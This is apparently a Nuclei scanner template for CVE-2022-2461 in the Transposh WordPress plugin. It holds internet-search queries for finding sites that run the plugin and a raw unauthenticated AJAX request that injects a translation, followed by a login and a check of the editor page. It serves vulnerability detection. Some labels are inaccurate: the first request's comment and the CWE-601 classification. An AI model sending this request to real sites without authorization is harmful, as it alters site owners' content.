id: CVE-2022-2461

info:
  name: Transposh WordPress Translation <= 1.0.9.6 - Unauthorized Settings Change
  author: popcorn94
  severity: medium
  description: |
    The Transposh WordPress Translation plugin for WordPress is vulnerable to unauthorized setting changes by unauthenticated users in versions up to, and including, 1.0.9.6. This is due to insufficient permissions checking on the 'tp_translation' AJAX action and default settings which makes it possible for unauthenticated attackers to influence the data shown on the site.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-2461
    - https://github.com/common-repository/transposh-translation-filter-for-wordpress/archive/refs/tags/v1.0.8.zip(plugin)
    - https://github.com/MrTuxracer/advisories/blob/master/CVEs/CVE-2022-2461.txt
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    cve-id: CVE-2022-2461
    cwe-id: CWE-601
    epss-score: 0.00085
    epss-percentile: 0.25683
    cpe: cpe:2.3:a:transposh-translation-filter-for-wordpress:transposh-translation-filter-for-wordpress:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: oferwald
    product: transposh-translation-filter-for-wordpress
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/transposh-translation-filter-for-wordpress"
    fofa-query: body=/wp-content/plugins/transposh-translation-filter-for-wordpress/
    publicwww-query: /wp-content/plugins/transposh-translation-filter-for-wordpress/
  tags: cve,cve2022,wordpress

variables:
  username: "test"
  password: "test"
  Hostname: "localhost"
  
http:
  - raw:
      - | # login admin account
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=tp_translation&ln0=en&sr0=rcesecurity.com&items=1&tk0=rcesecurity.com&tr0=rcesecurity.com
        
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In

      - |
        GET /wordpress/wp-admin/admin.php?page=tp_editor HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "Original string\">rcesecurity.com"
          - "Translated string\">rcesecurity.com"
        condition: and
        part: body